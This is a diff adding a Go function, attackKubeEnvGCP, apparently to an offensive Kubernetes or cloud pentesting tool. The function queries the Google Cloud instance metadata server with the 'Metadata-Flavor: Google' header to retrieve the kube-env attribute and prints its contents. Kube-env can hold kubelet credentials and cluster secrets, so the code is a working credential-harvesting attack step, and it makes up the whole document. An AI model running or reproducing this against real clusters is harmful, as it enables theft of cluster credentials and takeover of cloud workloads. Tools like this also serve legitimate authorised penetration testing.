@@ -187,3 +187,22 @@ eachbucket:
 	return nil
 
 }
+
+func attackKubeEnvGCP(interactive bool) {
+	// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
+
+	var headers = []HeaderLine{
+		{"Metadata-Flavor", "Google"},
+	}
+	kubeEnv, _ := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
+	if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) {
+		println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
+		// TODO: Should we get error code the way we used to:
+		// fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
+		pauseToHitEnter(interactive)
+	}
+	kubeEnvLines := strings.Split(string(kubeEnv), "\n")
+	for _, line := range kubeEnvLines {
+		println(line)
+	}
+}
